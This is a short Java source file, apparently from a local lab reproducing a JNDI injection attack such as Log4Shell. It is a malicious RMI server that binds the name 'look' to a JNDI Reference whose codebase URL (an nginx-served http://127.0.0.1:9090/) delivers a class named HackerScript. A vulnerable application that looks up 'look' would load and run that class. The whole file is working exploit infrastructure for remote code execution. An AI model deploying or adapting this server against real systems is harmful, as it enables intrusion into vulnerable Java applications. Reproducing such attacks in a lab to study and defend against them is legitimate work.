package com.iefihz.hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * HackerRmiServer 测试rmi服务与我的服务在同不同工程，其中
 * 代码中的 http://127.0.0.1:9090/ 为nginx配置，具体查看 readme.md
 *
 * @author He Zhifei
 * @date 2021/12/24 22:24
 */
public class HackerRmiServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(8080);
        String hackerScriptClassName = HackerScript.class.getName();
        registry.bind(
                "look",
                new ReferenceWrapper(new Reference(null, hackerScriptClassName, "http://127.0.0.1:9090/"))
        );
    }
}
